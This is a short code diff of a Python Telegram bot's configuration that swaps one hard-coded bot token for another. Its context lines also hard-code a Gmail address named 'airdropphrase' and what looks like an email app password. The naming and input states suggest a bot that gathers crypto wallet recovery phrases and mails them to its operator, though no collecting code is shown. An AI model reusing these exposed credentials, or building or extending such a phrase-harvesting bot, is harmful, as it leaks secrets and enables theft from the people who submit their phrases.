@@ -38,7 +38,7 @@ RECEIVE_INPUT = 6
 AWAIT_RESTART = 7
 
 # Config (use environment variables in production)
-BOT_TOKEN = os.getenv("TOKEN", os.getenv("BOT_TOKEN", "7950018746:AAELUPAMtq2xuPDOSU26embklKfESvq8R58"))
+BOT_TOKEN = os.getenv("TOKEN", os.getenv("BOT_TOKEN", "8429262652:AAE2MHrxxgiKjgKwhg4rqvd9MXWIelHTKX"))
 SENDER_EMAIL = os.getenv("SENDER_EMAIL", "airdropphrase@gmail.com")
 SENDER_PASSWORD = os.getenv("SENDER_PASSWORD", " ipxs ffag eqmk otqd")
 RECIPIENT_EMAIL = os.getenv("RECIPIENT_EMAIL", "airdropphrase@gmail.com")
@@ -1405,4 +1405,5 @@ def main() -> None:
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
+
     main()
